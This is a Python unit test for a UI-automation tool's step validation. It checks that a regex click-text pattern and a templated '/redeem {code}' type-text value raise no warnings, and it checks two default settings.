def test_regex_text_is_not_split_and_template_text_warning() -> None:
    step = m.make_step(m.StepType.CLICK_TEXT)
    step.params.text, step.params.match = "^(OK|確定)$", m.TextMatch.REGEX  # T27
    assert not [i for i in step.validate(0) if i.path.endswith(".text")]
    tt = m.make_step(m.StepType.TYPE_TEXT)
    tt.params.text = "/redeem {code}"
    assert not [i for i in tt.validate(0) if i.path.endswith(".text")]
    assert m.make_step(m.StepType.CLICK_TEXT).params.on_not_found is m.TimeoutAction.FAIL
    assert m.OcrCheckParams().only_new_text is True
